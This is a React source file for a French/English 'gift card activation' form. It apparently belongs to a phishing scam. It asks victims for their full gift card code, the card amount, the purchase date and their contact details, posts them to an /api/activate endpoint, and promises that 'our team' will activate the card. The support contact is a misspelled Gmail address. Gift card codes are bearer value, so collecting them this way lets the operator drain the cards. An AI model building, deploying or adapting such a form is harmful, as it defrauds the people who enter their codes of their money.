import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { ArrowLeft, Eye, EyeOff, Shield, Mail, Phone, Calendar, CreditCard, User, MessageSquare } from 'lucide-react';

const ActivationForm = ({ selectedCard, onBack, language }) => {
  const [formData, setFormData] = useState({
    fullName: "",
    emailOrPhone: "",
    cardType: selectedCard?.name || "",
    cardCode: "",
    hideCode: false,
    cardAmount: "",
    purchaseDate: "",
  });

  const [errors, setErrors] = useState({});
  const [showCode, setShowCode] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const texts = {
    fr: {
      title: `Activation de votre carte ${selectedCard?.name}`,
      subtitle: "Remplissez le formulaire, notre équipe active votre carte et vous renvoie un message",
      fields: {
        fullName: "Nom complet",
        emailOrPhone: "Email ou Téléphone",
        cardType: "Type de carte",
        cardCode: "Code de la carte",
        hideCode: "Cacher le code de la carte",
        cardAmount: "Montant de la carte",
        purchaseDate: "Date d'achat",
      },
      placeholders: {
        fullName: "Votre nom complet",
        emailOrPhone: "votre@email.com ou +33 6 12 34 56 78",
        cardCode: "Entrez le code de votre carte",
        cardAmount: "Montant en euros",
      },
      buttons: {
        back: "Retour",
        submit: "Envoyer la demande",
        submitting: "Envoi en cours..."
      },
      success: {
        title: "Demande envoyée avec succès !",
        message: "Votre demande a bien été envoyée. Notre équipe vous répondra sous quelques minutes.",
        contact: "Contact Service Client :"
      },
      errors: {
        required: "Ce champ est obligatoire",
        emailOrPhone: "Email ou numéro de téléphone invalide"
      }
    },
    en: {
      title: `Activate your ${selectedCard?.name} card`,
      subtitle: "Fill out the form, our team will activate your card and send you a message",
      fields: {
        fullName: "Full Name",
        emailOrPhone: "Email or Phone",
        cardType: "Card Type",
        cardCode: "Card Code",
        hideCode: "Hide card code",
        cardAmount: "Card Amount",
        purchaseDate: "Purchase Date",
      },
      placeholders: {
        fullName: "Your full name",
        emailOrPhone: "your@email.com or +1 234 567 8900",
        cardCode: "Enter your card code",
        cardAmount: "Amount in currency",
      },
      buttons: {
        back: "Back",
        submit: "Send Request",
        submitting: "Sending..."
      },
      success: {
        title: "Request sent successfully!",
        message: "Your request has been sent. Our team will respond within a few minutes.",
        contact: "Customer Service Contact:"
      },
      errors: {
        required: "This field is required",
        emailOrPhone: "Invalid email or phone number"
      }
    }
  };

  const t = texts[language] || texts.fr;

  const validateForm = () => {
    const newErrors = {};

    if (!formData.emailOrPhone.trim()) {
      newErrors.emailOrPhone = t.errors.required;
    } else if (!(/\S+@\S+\.\S+/.test(formData.emailOrPhone) || /^\+?[0-9\s\-()]{7,20}$/.test(formData.emailOrPhone))) {
      newErrors.emailOrPhone = t.errors.emailOrPhone;
    }
    if (!formData.cardCode.trim()) newErrors.cardCode = t.errors.required;
    if (!formData.cardAmount.trim()) newErrors.cardAmount = t.errors.required;
    if (!formData.purchaseDate.trim()) newErrors.purchaseDate = t.errors.required;

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) return;

    setIsSubmitting(true);
    
    try {
      const response = await fetch('/api/activate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...formData,
          emailOrPhone: formData.emailOrPhone, // Assurez-vous que le champ est correctement envoyé
        }),
      });

      const result = await response.json();

      if (response.ok) {
        setIsSubmitted(true);
      } else {
        console.error('Erreur:', result.error);
        // Vous pouvez ajouter une gestion d'erreur ici
      }
    } catch (error) {
      console.error('Erreur réseau:', error);
      // Vous pouvez ajouter une gestion d'erreur ici
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleInputChange = (field, value) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: '' }));
    }
  };

  if (isSubmitted) {
    return (
      <motion.div
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        className="min-h-screen bg-gradient-to-br from-green-50 to-emerald-100 flex items-center justify-center p-4"
      >
        <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full text-center">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <Shield className="w-8 h-8 text-green-600" />
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-4">{t.success.title}</h2>
          <p className="text-gray-600 mb-6">{t.success.message}</p>
          <div className="border-t pt-6">
            <p className="text-sm text-gray-500 mb-2">{t.success.contact}</p>
            <a 
              href="mailto:activatemygiftcaard@gmail.com"
              className="text-blue-600 hover:text-blue-800 font-medium"
            >
              activatemygiftcaard@gmail.com
            </a>
          </div>
          <button
            onClick={onBack}
            className="mt-6 w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition-colors"
          >
            {t.buttons.back}
          </button>
        </div>
      </motion.div>
    );
  }

  return (
    <motion.div
      initial={{ opacity: 0, x: 20 }}
      animate={{ opacity: 1, x: 0 }}
      className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-8"
    >
      <div className="container mx-auto px-4 max-w-2xl">
        <button
          onClick={onBack}
          className="flex items-center text-blue-600 hover:text-blue-800 mb-6 transition-colors"
        >
          <ArrowLeft className="w-5 h-5 mr-2" />
          {t.buttons.back}
        </button>

        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
          <div className="bg-gradient-to-r from-blue-600 to-indigo-600 p-6 text-white">
            <div className="flex items-center mb-4">
              <img
                src={selectedCard?.logo}
                alt={selectedCard?.name}
                className="w-12 h-12 object-contain bg-white rounded-lg p-2 mr-4"
              />
              <div>
                <h1 className="text-2xl font-bold">{t.title}</h1>
                <p className="text-blue-100">{t.subtitle}</p>
              </div>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="p-6 space-y-6">
            {/* Nom complet */}
            <div>
              <label className="flex items-center text-sm font-medium text-gray-700 mb-2">
                <User className="w-4 h-4 mr-2" />
                {t.fields.fullName} *
              </label>
              <input
                type="text"
                value={formData.fullName}
                onChange={(e) => handleInputChange('fullName', e.target.value)}
                placeholder={t.placeholders.fullName}
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.fullName ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.fullName && <p className="text-red-500 text-sm mt-1">{errors.fullName}</p>}
            </div>

            {/* Email ou Téléphone */}
            <div>
              <label className="flex items-center text-sm font-medium text-gray-700 mb-2">
                <Mail className="w-4 h-4 mr-2" />
                {t.fields.emailOrPhone} *
              </label>
              <input
                type="text"
                value={formData.emailOrPhone}
                onChange={(e) => handleInputChange("emailOrPhone", e.target.value)}
                placeholder={t.placeholders.emailOrPhone}
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.emailOrPhone ? "border-red-500" : "border-gray-300"
                }`}
              />
              {errors.emailOrPhone && <p className="text-red-500 text-sm mt-1">{errors.emailOrPhone}</p>}
            </div>

            {/* Type de carte */}
            <div>
              <label className="flex items-center text-sm font-medium text-gray-700 mb-2">
                <CreditCard className="w-4 h-4 mr-2" />
                {t.fields.cardType} *
              </label>
              <input
                type="text"
                value={formData.cardType}
                readOnly
                className="w-full px-4 py-3 border border-gray-300 rounded-lg bg-gray-50"
              />
            </div>

            {/* Code de la carte */}
            <div>
              <label className="flex items-center text-sm font-medium text-gray-700 mb-2">
                <Shield className="w-4 h-4 mr-2" />
                {t.fields.cardCode} *
              </label>
              <div className="relative">
                <input
                  type={showCode ? "text" : "password"}
                  value={formData.cardCode}
                  onChange={(e) => handleInputChange('cardCode', e.target.value)}
                  placeholder={t.placeholders.cardCode}
                  className={`w-full px-4 py-3 pr-12 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    errors.cardCode ? 'border-red-500' : 'border-gray-300'
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowCode(!showCode)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                >
                  {showCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              {errors.cardCode && <p className="text-red-500 text-sm mt-1">{errors.cardCode}</p>}
              
              <div className="mt-2">
                <label className="flex items-center">
                  <input
                    type="checkbox"
                    checked={formData.hideCode}
                    onChange={(e) => handleInputChange('hideCode', e.target.checked)}
                    className="mr-2"
                  />
                  <span className="text-sm text-gray-600">{t.fields.hideCode}</span>
                </label>
              </div>
            </div>

            {/* Montant */}
            <div>
              <label className="flex items-center text-sm font-medium text-gray-700 mb-2">
                <CreditCard className="w-4 h-4 mr-2" />
                {t.fields.cardAmount} *
              </label>
              <input
                type="text"
                value={formData.cardAmount}
                onChange={(e) => handleInputChange('cardAmount', e.target.value)}
                placeholder={t.placeholders.cardAmount}
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.cardAmount ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.cardAmount && <p className="text-red-500 text-sm mt-1">{errors.cardAmount}</p>}
            </div>

            {/* Date d'achat */}
            <div>
              <label className="flex items-center text-sm font-medium text-gray-700 mb-2">
                <Calendar className="w-4 h-4 mr-2" />
                {t.fields.purchaseDate} *
              </label>
              <input
                type="date"
                value={formData.purchaseDate}
                onChange={(e) => handleInputChange('purchaseDate', e.target.value)}
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                  errors.purchaseDate ? 'border-red-500' : 'border-gray-300'
                }`}
              />
              {errors.purchaseDate && <p className="text-red-500 text-sm mt-1">{errors.purchaseDate}</p>}
            </div>



            {/* Bouton de soumission */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-4 rounded-lg font-semibold hover:from-blue-700 hover:to-indigo-700 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? t.buttons.submitting : t.buttons.submit}
            </button>
          </form>
        </div>
      </div>
    </motion.div>
  );
};

export default ActivationForm;

